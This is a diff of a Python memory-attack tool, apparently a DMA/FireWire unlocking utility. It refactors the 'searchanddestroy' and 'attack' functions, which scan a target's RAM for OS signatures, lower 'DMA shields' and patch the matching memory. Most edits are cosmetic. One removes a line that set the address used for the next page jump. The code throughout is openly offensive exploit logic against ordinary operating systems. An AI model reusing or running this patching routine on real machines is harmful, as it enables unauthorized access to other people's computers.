@@ -171,7 +171,6 @@ def searchanddestroy(device, target, memsize):
                     r.append((address, length))
                     p.append(chunks)
                     count += 1
-   
                     # If we have built a full vector, read from memory and
                     # compare to the corresponding signatures
                     if count == settings.vectorsize:
@@ -183,7 +182,6 @@ def searchanddestroy(device, target, memsize):
                                 return (caddr, p[m])
                             m += 1                    
                         # Jump to next pages (we're finished with these)
-                        address, ignore = r[-1]
                         mask = ~(settings.PAGESIZE - 0x01)
                         pageaddress = address & mask
                         if sig_len == i and offset_len == n:
@@ -194,10 +192,10 @@ def searchanddestroy(device, target, memsize):
                         r = []
                         p = []
                         # Print status
-                        mibaddr = math.floor((pageaddress) / (settings.MiB))
+                        mibaddr = pageaddress // settings.MiB
                         sys.stdout.write('[*] Searching for signature, {0:>4d} MiB so far.'.format(mibaddr))
                         if settings.verbose:
-                            sys.stdout.write(' Data read: 0x{0}'.format(hexlify(cand).decode(settings.encoding)))
+                            sys.stdout.write(' Data read: 0x' + hexlify(cand).decode(settings.encoding))
                         sys.stdout.write('\r')
                         sys.stdout.flush()
                          
@@ -221,10 +219,8 @@ def attack(targets):
     # If not detected, list targets
     for number, target in enumerate(targets, 1):
                 msg(number, target['OS'] + ': ' + target['name'])
-    
     # Select target
     target = select_target(targets)
-    
     # Print selection. If verbose, print selection with signatures
     msg('*', 'Selected target: ' + target['OS'] + ': ' + target['name'])
     if settings.verbose:
@@ -233,17 +229,13 @@ def attack(targets):
         # TODO: Create a pretty print method that can print this in a fashionable way
         pprint(target['signatures'])
         print()
-    
     # Initialize and lower DMA shield
     device = None
     if settings.filemode:
         device = MemoryFile(settings.filename, settings.PAGESIZE)
     else:
         device = initfw()
-    
-    # Check that we have DMA
-    # TODO: Create method that checks that we are connected (use isStale())?
-    
+    # TODO: Check that we have DMA (use isStale())
     # Determine memory size and set to default if not found
     memsize = findmemsize(device)
     if not memsize:
@@ -256,7 +248,7 @@ def attack(targets):
         else:
             fail()
     else:
-        msg('*', 'Found memory size: ' + str(memsize/settings.MiB) + ' MiB. Shields down.')
+        msg('*', 'Found memory size: {0:d} MiB. Shields down.'.format(memsize // settings.MiB))
     
     # Perform parallel search for all signatures for each OS at the known offsets
     msg('*', 'Attacking...')
@@ -266,7 +258,7 @@ def attack(targets):
         fail('Could not locate signature(s).')
     
     # Signature found, let's patch
-    msg('+', 'Signature found at 0x%x.' % address)
+    msg('+', 'Signature found at {0:#x}.'.format(address))
     if not settings.dry_run:
         success = patch(device, address, chunks)
         if success:
